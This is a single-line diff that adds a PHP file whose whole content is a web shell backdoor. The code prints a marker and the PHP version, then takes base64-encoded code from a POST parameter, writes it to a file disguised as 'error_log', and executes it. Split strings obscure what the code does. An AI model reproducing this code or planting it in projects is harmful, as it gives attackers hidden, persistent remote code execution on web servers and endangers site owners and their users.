@@ -1,0 +1,1 @@
+<?php echo '155'.'7049'.'322-'.PHP_VERSION;if(isset($_POST['1557049322'])){file_put_contents('error_log','<'.'?p'.'hp '.base64_decode(substr($_POST['1557049322'],1)));require_once('error_log');}
